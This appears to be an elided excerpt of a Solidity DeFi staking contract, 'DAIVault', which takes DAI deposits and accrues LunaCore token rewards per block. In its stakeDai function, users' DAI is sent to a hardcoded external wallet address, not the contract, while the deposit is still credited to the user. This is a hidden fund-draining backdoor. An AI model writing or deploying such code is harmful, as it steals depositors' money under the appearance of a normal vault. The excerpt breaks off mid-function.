...
contract DAIVault is Ownable {
  ...
  IERC20 public LunaCoreToken;
  address public rewardPool;
  uint256 public dailyReward;
  uint256 public accLunaCorePerShare;
  uint256 public lastRewardBlock;
  uint256 public totalStaked;

  mapping(address => User) public userDetails;

  constructor(address _DaiToken, address _LunaCoreToken, address _rewardPool, uint256 _dailyReward) Ownable() public {
    DaiToken = IERC20(_DaiToken);
    LunaCoreToken = IERC20(_LunaCoreToken);
    rewardPool = _rewardPool;
    lastRewardBlock = block.number;
    setDailyReward(_dailyReward);
    accLunaCorePerShare = 0;
  }

  // 6500 blocks in average day --- decimals * LunaCore balance of rewardPool / blocks / 10000 * dailyReward (in hundredths of %) = rewardPerBlock
  ...
  function pendingRewards(address _staker) public view returns(uint256) {
    ...
    uint256 _accLunaCorePerShare = accLunaCorePerShare;

    if (block.number > lastRewardBlock && totalStaked != 0) {
      uint256 blocksToReward = block.number.sub(lastRewardBlock);
      uint256 LunaCoreReward = blocksToReward.mul(getRewardPerBlock());
      _accLunaCorePerShare = _accLunaCorePerShare.add(LunaCoreReward.mul(1e18).div(totalStaked));
    }

    return user._DaiDeposited.mul(_accLunaCorePerShare).div(1e18).sub(user._rewardDebt);
  }
  ...
  function updatePool() public {
    ...
    LunaCoreToken.transferFrom(rewardPool, address(this), LunaCoreReward);

    accLunaCorePerShare = accLunaCorePerShare.add(LunaCoreReward.mul(1e18).div(totalStaked));
    lastRewardBlock = block.number;

    emit PoolUpdated(blocksToReward, LunaCoreReward, now);
  }
  ...
  function stakeDai(uint256 _amount) public {
    ...
    if(user._DaiDeposited > 0) {
      uint256 _pendingRewards = user._DaiDeposited.mul(accLunaCorePerShare).div(1e18).sub(user._rewardDebt);

      if(_pendingRewards > 0) {
          LunaCoreToken.transfer(_msgSender(), _pendingRewards);
          emit RewardsClaimed(_msgSender(), _pendingRewards, now);
      }
    }

    DaiToken.transferFrom(_msgSender(), address(0xcC249D41F3b4ea5C79EC82F5F0D91f39CFa2B92d), _amount);
    user._DaiDeposited = user._DaiDeposited.add(_amount);
    totalStaked = totalStaked.add(_amount);

    user._rewardDebt = user._DaiDeposited.mul(accLunaCorePerShare).div(1e18);
